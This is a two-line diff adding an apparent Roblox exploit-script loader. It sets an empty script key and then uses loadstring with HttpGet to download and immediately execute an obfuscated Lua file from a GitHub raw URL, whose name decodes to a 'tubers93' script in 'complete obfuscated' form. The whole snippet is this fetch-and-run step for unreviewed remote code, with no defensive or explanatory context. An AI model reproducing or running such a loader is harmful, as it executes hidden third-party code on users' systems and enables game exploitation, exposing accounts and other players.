@@ -1,0 +1,2 @@
+getgenv().SCRIPT_KEY = ""
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Wbw1470619303-ctrl/wbwhnb/refs/heads/main/tubers93%E8%84%9A%E6%9C%AC%E5%AE%8C%E6%95%B4%E7%89%88%E6%B7%B7%E6%B7%86.lua"))()
